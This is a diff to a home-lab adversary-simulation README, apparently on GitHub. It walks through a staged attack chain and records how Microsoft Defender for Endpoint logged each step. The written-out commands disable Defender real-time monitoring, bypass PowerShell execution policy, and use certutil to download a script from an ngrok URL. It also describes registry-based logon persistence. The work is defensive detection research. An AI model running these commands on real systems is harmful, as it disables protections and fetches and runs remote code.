@@ -62,17 +62,22 @@ Simulate a realistic attacker chain to study:
 
 ## ⚠️ Adversary Simulation Steps
 
-1. On Attacker machine I created a file with a script that creates a hidden directory with a "reverse shell" script (just opens calculator app). It also creates persistence with registry keys that runs on logon.
+1. On Attacker machine I created a file (maint.ps1) with a script that creates a hidden directory with a "reverse shell" script (just opens the calculator app). It also creates persistence with registry keys that runs on logon.
 
 <img width="750" height="438" alt="image" src="https://github.com/user-attachments/assets/1971e217-14ac-4715-a092-b21b70c70093" />
 
 2. I created a python http server and proxied the connection through ngrok, to create a temporary URL from which I can pull the created file onto the victim machine.
+**Commands used on Kali Linux**: `python3 -m http.server 8888` & `ngrok http 8888`
+
 3. On the victim machine I disabled real time monitoring and bypassed execution policy with: `Set-MpPreference -DisableRealtimeMonitoring $true` and `Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass`
+
 4. The previous command allowed certutil to download files from the attacker machine and run the downloaded file.
-Command used: `certutil -urlcache -split -f https://fisher-promarriage-untremendously.ngrok-free.dev/maint.ps1 maint.ps1`
+**Command used:** `certutil -urlcache -split -f https://fisher-promarriage-untremendously.ngrok-free.dev/maint.ps1 maint.ps1`
+
 <img width="650" height="186" alt="image" src="https://github.com/user-attachments/assets/3256cdf0-ce4c-4ad2-af2a-8ca2910c91ea" />
 
-5. After executing the downloaded file, a new file was ready to be executed which could lead to a reverse shell, but I decided to let it just execute calculator.exe
+6. After executing the downloaded file, a new file was ready to be executed which could lead to a reverse shell, but I decided to let it just execute calculator.exe
+
 <img width="450" height="918" alt="image" src="https://github.com/user-attachments/assets/d0ca2bac-2888-4499-88fb-ada1aa6f0c84" />
 
 
@@ -84,8 +89,25 @@ Command used: `certutil -urlcache -split -f https://fisher-promarriage-untremend
 
 **MITRE:** T1562.001 – Disable or Modify Security Tools
 
-> 📷 Insert command screenshot here  
-> 📷 Insert Defender log screenshot here  
+**Command:** `Set-MpPreference -DisableRealtimeMonitoring $true`
+ 
+<img width="600" height="80" alt="image" src="https://github.com/user-attachments/assets/2c10fdb7-9ea2-4cbf-9570-f6520cd459e8" />
+
+<img width="650" height="596" alt="image" src="https://github.com/user-attachments/assets/8b0c562e-4be7-4acc-9382-ad61813d5503" />
+
+**Observations**: 
+
+When the command was executed, Microsoft Defender for Endpoint did not record the activity in the DeviceProcessEvents table as initially expected.
+
+Instead, the activity was primarily captured in:
+
+DeviceEvents (under AdditionalFields)
+
+DeviceRegistryEvents
+
+This indicates that Defender prioritized logging the configuration change and security state modification rather than the PowerShell process execution itself.
+
+The DeviceEvents table reflected the real-time protection state change, while DeviceRegistryEvents recorded the underlying registry modifications associated with the Defender configuration update.
 
 ---
 
@@ -95,18 +117,33 @@ Command used: `certutil -urlcache -split -f https://fisher-promarriage-untremend
 
 Observed:
 
-- Execution policy modification
+- Execution policy modification: `Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass`
 - Script execution from user directory
 - Child process spawning
 
-> 📷 Insert PowerShell execution log  
-> 📷 Insert DeviceProcessEvents screenshot  
+<img width="650" height="1064" alt="image" src="https://github.com/user-attachments/assets/f0ae2c25-925f-4bb2-be2f-43f0cfa9012f" />
+ 
+**Observations**:
+
+Several DeviceEvents entries were generated for the execution policy command. During initial VM onboarding, most related events were executed under NT AUTHORITY\SYSTEM and appeared in the InitiatingProcessCommandLine field. This behavior is expected, as onboarding scripts typically run with elevated system privileges.
+
+For the standalone execution I performed manually, the relevant event was distinguishable by:
+
+The user context (non-SYSTEM account)
+
+The command being recorded under the AdditionalFields section rather than InitiatingProcessCommandLine
+
+This distinction highlights the importance of reviewing both execution context and event field placement when investigating PowerShell-related activity. System-initiated configuration actions may appear differently in telemetry compared to user-driven commands, even when the underlying command is similar.
 
 ---
 
 ## 3️⃣ Ingress Tool Transfer (LOLBIN)
 
-**MITRE:** T1105 – Ingress Tool Transfer
+**MITRE:**
+
+T1218 – Signed Binary Proxy Execution
+
+T1105 – Ingress Tool Transfer
 
 Native Windows utility used to retrieve remote script.
 
@@ -116,8 +153,35 @@ Resulted in:
 - Process creation event
 - Living-off-the-Land alert
 
-> 📷 Insert LOLBin alert screenshot  
-> 📷 Insert process tree screenshot  
+**Command used**: `certutil -urlcache -split -f https://fisher-promarriage-untremendously.ngrok-free.dev/maint.ps1 maint.ps1`
+
+**Alert on LOLbin usage**
+<img width="750" height="950" alt="image" src="https://github.com/user-attachments/assets/b4dbbb15-9781-4324-be68-5ab219690e75" />
+
+**DeviceProcessEvents**:
+<img width="700" height="400" alt="image" src="https://github.com/user-attachments/assets/eff3082d-af7e-427d-a7ad-0cd1d45a343f" />
+
+**DeviceNetworkEvents**:
+<img width="1000" height="286" alt="image" src="https://github.com/user-attachments/assets/decad965-d464-4606-b0b7-1f3f96e540a5" />
+
+
+**Observations**:
+
+The execution of certutil.exe was successfully recorded in DeviceProcessEvents, including:
+- Process name: certutil.exe
+- Full command line with URL and output file
+- Parent process: powershell.exe
+- User context: non-SYSTEM account
+
+This confirms Defender captured the LOLBIN execution at the process telemetry level.
+
+Additionally, related outbound connections were logged in network telemetry, showing:
+- Remote IP addresses
+- Remote URLs
+- Remote ports (80 and 443)
+- Initiating process: certutil.exe
+
+This demonstrates Defender’s ability to correlate process execution with network activity, which is critical when detecting living-off-the-land techniques.
 
 ---
 
